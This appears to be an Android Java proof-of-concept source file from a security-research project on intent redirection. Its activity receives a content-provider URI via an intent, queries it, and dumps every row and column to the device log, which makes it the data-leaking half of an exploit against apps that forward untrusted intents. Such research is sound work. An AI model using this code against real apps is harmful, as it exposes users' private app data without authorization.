package sherlock.poc.intent_redirection;

import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.util.Log;

import androidx.appcompat.app.AppCompatActivity;

public class LeakProviderActivity extends AppCompatActivity {

    private static final String TAG = "sherlock.poc.intent_redirection.LeakProviderActivity";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        Uri providerUri = Uri.parse(getIntent().getDataString());
        Cursor c = getContentResolver().query(
                providerUri,
                null,
                null,
                null,
                null
        );
        try {
            if (c.getCount() == 0) {
                return;
            }
            c.moveToFirst();
            StringBuilder sb = new StringBuilder();
            while (!c.isAfterLast()) {
                for (int i = 0; i < c.getColumnCount(); i++) {
                    String providerData = c.getColumnName(i) + ":" + c.getString(i) + ";\n";
                    sb.append(providerData);
                }
                c.moveToNext();
            }
            Log.i(TAG, "Output: " + sb);
        } finally {
            c.close();
        }
    }
}
